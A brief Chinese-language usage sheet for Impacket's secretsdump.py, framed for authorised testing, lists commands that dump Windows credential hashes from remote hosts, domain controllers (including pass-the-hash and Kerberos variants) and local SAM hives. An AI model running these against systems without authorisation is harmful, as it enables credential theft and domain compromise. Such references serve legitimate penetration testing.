# secretsdump.py 使用

secretsdump.py 用于在授权场景中导出 Windows 凭据材料和域控哈希。

## 常用命令

```bash
secretsdump.py domain.local/user:pass@192.168.1.10
```

```bash
secretsdump.py -hashes LMHASH:NTHASH domain.local/user@192.168.1.10
```

```bash
secretsdump.py -just-dc domain.local/user:pass@dc01.domain.local
```

```bash
secretsdump.py -sam -system SYSTEM -security SECURITY LOCAL
```

```bash
secretsdump.py -k -no-pass dc01.domain.local
```

这类输出高度敏感，保存时要加密并控制报告里暴露的哈希范围。
